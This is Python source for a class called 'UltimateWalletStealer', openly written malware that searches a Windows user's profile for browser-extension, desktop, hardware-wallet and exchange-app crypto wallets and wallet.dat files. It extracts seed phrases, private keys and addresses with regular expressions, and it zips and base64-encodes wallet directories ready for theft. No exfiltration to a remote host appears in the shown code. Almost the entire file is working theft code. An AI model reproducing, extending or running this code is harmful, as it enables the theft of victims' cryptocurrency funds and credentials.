import os
import json
import shutil
import base64
import glob
import re
import zipfile
import tempfile
import asyncio
from Crypto.Cipher import AES
import win32crypt

class UltimateWalletStealer:
    def __init__(self):
        self.wallet_targets = {
            "browser_wallets": {
                "MetaMask": [
                    "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "AppData/Local/BraveSoftware/Brave-Browser/User Data/*/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
                    "AppData/Local/Microsoft/Edge/User Data/*/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"
                ],
                "Phantom": [
                    "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa",
                    "AppData/Local/BraveSoftware/Brave-Browser/User Data/*/Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa"
                ],
                "Coinbase Wallet": [
                    "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"
                ],
                "Trust Wallet": [
                    "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph"
                ],
                "Binance Chain": [
                    "AppData/Local/Google/Chrome/User Data/*/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"
                ]
            },
            "desktop_wallets": {
                "Exodus": ["AppData/Roaming/Exodus"],
                "Atomic": ["AppData/Roaming/atomic"],
                "Electrum": ["AppData/Roaming/Electrum/wallets"],
                "Monero": ["AppData/Roaming/monero-wallet-gui"],
                "Zcash": ["AppData/Roaming/Zcash"],
                "Wasabi": ["AppData/Roaming/WalletWasabi"],
                "BlueWallet": ["AppData/Roaming/BlueWallet"]
            },
            "hardware_wallets": {
                "Ledger Live": ["AppData/Roaming/Ledger Live"],
                "Trezor Suite": ["AppData/Roaming/Trezor Suite"]
            },
            "exchange_apps": {
                "Binance": ["AppData/Roaming/Binance"],
                "Coinbase": ["AppData/Local/Coinbase"],
                "Kraken": ["AppData/Roaming/Kraken"]
            },
            "file_wallets": {
                "Wallet.dat": [
                    "AppData/Roaming/Bitcoin/wallet.dat",
                    "AppData/Roaming/Litecoin/wallet.dat", 
                    "AppData/Roaming/Dogecoin/wallet.dat",
                    "AppData/Roaming/Dash/wallet.dat"
                ],
                "Keystore": [
                    "AppData/Roaming/Ethereum/keystore",
                    "AppData/Local/Programs/ethereum-wallet/keystore"
                ]
            }
        }

    async def extract_browser_wallet_data(self, wallet_path):
        try:
            wallet_data = {
                "seeds": [],
                "private_keys": [],
                "addresses": [],
                "configs": []
            }
            
            for root, dirs, files in os.walk(wallet_path):
                for file in files:
                    if file.endswith(('.ldb', '.log', '.json')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                
                                seeds = self.extract_seed_phrases(content)
                                private_keys = self.extract_private_keys(content)
                                addresses = self.extract_crypto_addresses(content)
                                configs = self.extract_wallet_configs(content)
                                
                                if seeds:
                                    wallet_data["seeds"].extend(seeds)
                                if private_keys:
                                    wallet_data["private_keys"].extend(private_keys)
                                if addresses:
                                    wallet_data["addresses"].extend(addresses)
                                if configs:
                                    wallet_data["configs"].extend(configs)
                                    
                        except:
                            continue
            
            return wallet_data
        except Exception as e:
            return {"error": str(e)}

    def extract_seed_phrases(self, content):
        seeds = []
        patterns = [
            r'\b(?:[a-z]+\s+){11}[a-z]+\b',
            r'\b(?:[a-z]+\s+){23}[a-z]+\b',
            r'seed[\'":\s]+([a-z\s]+)',
            r'mnemonic[\'":\s]+([a-z\s]+)',
            r'recovery[\'":\s]+([a-z\s]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                words = match.strip().split()
                if len(words) in [12, 24]:
                    seeds.append(' '.join(words))
        
        return list(set(seeds))

    def extract_private_keys(self, content):
        keys = []
        patterns = [
            r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}',
            r'[0-9a-fA-F]{64}',
            r'private[_\\-\s]?key[\'":\s]+([0-9a-fA-F]+)',
            r'privkey[\'":\s]+([0-9a-fA-F]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                keys.append(match.strip())
        
        return list(set(keys))

    def extract_crypto_addresses(self, content):
        addresses = []
        patterns = [
            r'0x[a-fA-F0-9]{40}',
            r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}',
            r'bc1[a-z0-9]{39,59}',
            r'[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            addresses.extend(matches)
        
        return list(set(addresses))

    def extract_wallet_configs(self, content):
        configs = []
        try:
            json_pattern = r'\{[^{}]*\"(?:address|privateKey|seed|mnemonic)\"[^{}]*\}'
            matches = re.findall(json_pattern, content)
            for match in matches:
                try:
                    config = json.loads(match)
                    configs.append(config)
                except:
                    continue
        except:
            pass
        return configs

    async def copy_wallet_files(self, path):
        try:
            if os.path.isfile(path):
                with open(path, 'rb') as f:
                    file_data = f.read()
                    return {
                        "filename": os.path.basename(path),
                        "data": base64.b64encode(file_data).decode(),
                        "size": len(file_data)
                    }
            else:
                with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
                    with zipfile.ZipFile(temp_zip.name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.json', '.dat', '.log', '.ldb', '.key', '.wallet')):
                                    file_path = os.path.join(root, file)
                                    arcname = os.path.relpath(file_path, path)
                                    zipf.write(file_path, arcname)
                    
                    with open(temp_zip.name, 'rb') as f:
                        zip_data = base64.b64encode(f.read()).decode()
                    
                    os.unlink(temp_zip.name)
                    return {
                        "filename": f"{os.path.basename(path)}.zip",
                        "data": zip_data,
                        "size": len(zip_data)
                    }
                    
        except Exception as e:
            return {"error": str(e)}

    async def scan_all_wallets(self):
        results = {}
        user_profile = os.path.expanduser("~")
        
        for category, wallets in self.wallet_targets.items():
            category_results = {}
            
            for wallet_name, path_patterns in wallets.items():
                wallet_results = []
                
                for path_pattern in path_patterns:
                    full_pattern = os.path.join(user_profile, path_pattern)
                    matches = glob.glob(full_pattern)
                    
                    for match in matches:
                        if os.path.exists(match):
                            if "Extension" in match or "Local Extension Settings" in match:
                                wallet_data = await self.extract_browser_wallet_data(match)
                            else:
                                wallet_data = await self.copy_wallet_files(match)
                            
                            if wallet_data and not (isinstance(wallet_data, dict) and wallet_data.get("error")):
                                wallet_results.append({
                                    "path": match,
                                    "data": wallet_data,
                                    "type": "browser" if "Extension" in match else "desktop"
                                })
                
                if wallet_results:
                    category_results[wallet_name] = wallet_results
            
            if category_results:
                results[category] = category_results
        
        return results

async def scan_all_wallets():
    stealer = UltimateWalletStealer()
    return await stealer.scan_all_wallets()

if __name__ == "__main__":
    async def main():
        wallets = await scan_all_wallets()
        print(f"Found wallets: {len(wallets)} categories")
        for category, data in wallets.items():
            print(f"{category}: {len(data)} wallets")
    
    asyncio.run(main())